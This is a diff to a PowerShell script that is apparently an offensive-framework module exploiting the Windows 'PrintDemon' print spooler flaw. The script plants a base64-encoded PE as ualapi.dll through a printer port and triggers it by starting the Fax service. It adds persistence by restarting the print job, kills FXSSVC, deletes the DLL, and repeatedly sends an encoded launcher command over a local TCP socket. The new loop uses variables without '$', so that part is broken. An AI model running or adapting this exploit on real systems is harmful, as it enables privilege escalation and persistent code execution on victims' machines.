@@ -27,12 +27,12 @@ param(
      [Parameter()]
      [string]$LauncherCode
  )
-$LauncherCode =  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LauncherCode))
+$LauncherCode = " kill (Get-Process FXSSVC).Id; Remove-Item -path  C:\Windows\System32\ualapi.dll;" + [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($LauncherCode))
 
 Add-PrinterDriver -Name "Generic / Text Only"
 Add-PrinterPort -Name "C:\Windows\system32\ualapi.dll"
 Add-Printer -Name "PrintDemon" -DriverName "Generic / Text Only" -PortName "C:\Windows\System32\Ualapi.dll"
-
+Set-Printer PrintDemon -KeepPrintedJobs $true
 
 $Ref = (
 "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
@@ -155,35 +155,35 @@ $PE =  [System.Convert]::FromBase64String('TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAA
 [IntPtr] $unmanaged = ([system.runtime.interopservices.marshal]::AllocHGlobal($pe.Length));
 [system.runtime.interopservices.marshal]::Copy($PE, 0, $unmanaged, $PE.Length);
 [Printer.RawPrinterHelper]::SendBytesToPrinter("PrintDemon", $unmanaged, $PE.Length);
-sc.exe start Fax
+#<Registry Persistence>
+Restart-PrintJob PrintDemon (Get-PrintJob PrintDemon).Id;
+sc.exe start Fax;
 
-$FTPServer = "localhost"
-$FTPPort = "9299"
+$FTPServer = "localhost";
+$FTPPort = "9299";
 
-$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort)
-$tcpStream = $tcpConnection.GetStream()
-$reader = New-Object System.IO.StreamReader($tcpStream)
-$writer = New-Object System.IO.StreamWriter($tcpStream)
-$writer.AutoFlush = $true
-$commands = @( "test `r",$LauncherCode,"`r" );
+$tcpConnection = New-Object System.Net.Sockets.TcpClient($FTPServer, $FTPPort);
+$tcpStream = $tcpConnection.GetStream();
+$reader = New-Object System.IO.StreamReader($tcpStream);
+$writer = New-Object System.IO.StreamWriter($tcpStream);
+$writer.AutoFlush = $true;
+$commands = @( "`r",$LauncherCode,"`r" );
 
 while ($tcpConnection.Connected)
 {
     while ($tcpStream.DataAvailable)
     {
-        $reader.ReadLine()
+        $reader.ReadLine();
     }
 
     if ($tcpConnection.Connected)
     {
-        ForEach ($str in $commands){
-            Start-Sleep -s 5
-            $command = $str
-            if ($command -eq "escape")
-            {
-                break
+        For (i=0; i -lt 5; i++){
+            ForEach ($str in $commands){
+                Start-Sleep -s 5;
+                $command = $str;
+                $writer.WriteLine($command) | Out-Null
             }
-            $writer.WriteLine($command) | Out-Null
         }
     }
 }
